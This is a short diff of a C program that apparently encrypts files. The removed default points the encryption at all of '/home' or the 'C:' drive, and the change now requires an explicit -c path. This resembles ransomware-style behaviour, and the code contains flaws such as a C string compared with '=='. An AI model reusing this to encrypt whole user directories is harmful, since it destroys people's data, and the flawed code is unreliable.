@@ -45,7 +45,10 @@ int main(int argc, char* argv[]) {
         strcpy(encryption_path, argv[argc-1]);
     }
     else {
-        if (os == "linux") {
+        perror("no -c parameter given");
+        exit(1);
+
+        /*if (os == "linux") {
             encryption_path = malloc(strlen("/home") + 1);
 
             if (encryption_path == NULL)
@@ -58,7 +61,7 @@ int main(int argc, char* argv[]) {
             if (encryption_path == NULL)
                 return 1;
             strcpy(encryption_path, "C:");
-        }
+        }*/
     }
 
     // Encryption process
